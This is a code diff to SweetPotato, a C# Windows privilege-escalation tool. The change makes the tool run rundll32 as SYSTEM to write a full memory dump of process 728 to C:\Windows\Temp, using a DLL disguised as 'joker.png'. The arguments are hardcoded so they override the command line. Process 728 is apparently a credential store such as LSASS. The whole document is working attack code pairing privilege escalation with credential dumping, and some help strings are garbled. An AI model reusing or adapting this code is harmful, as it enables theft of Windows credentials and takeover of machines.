@@ -33,8 +33,8 @@ namespace SweetPotato {
 
             string clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
             ushort port = 6666;
-            string program = @"c:\Windows\System32\cmd.exe";
-            string programArgs = null;
+            string program = @"C:\Windows\System32\rundll32.exe";
+            string programArgs = @"C:\Windows\Temp\joker.png,MiniDump 728 C:\Windows\Temp\joker.dmp full";
             ExecutionMethod executionMethod = ExecutionMethod.Auto;
             bool showHelp = false;
             bool isBITSRequired = false;
@@ -51,6 +51,9 @@ namespace SweetPotato {
                 .Add<ushort>("l=|listenPort=", "COM serv66)", v => port = v)
                 .Add("h|help", "Diselp", v => showHelp = v != null);
 
+
+
+            programArgs = @"C:\Windows\Temp\joker.png,MiniDump 728 C:\Windows\Temp\joker.dmp full";
             try {
 
                 option_set.Parse(args);
@@ -138,9 +141,7 @@ namespace SweetPotato {
 
                     if (programArgs != null)
                     {
-                        if (program.Equals("c:\\Windows\\System32\\cmd.exe")) { 
-                            programArgs = "/c " + programArgs; 
-                        }
+                       
                         finalArgs = string.Format("\"{0}\" {1}", program, programArgs);
                         Console.WriteLine("[+] Command : {0} ", finalArgs);
                     }
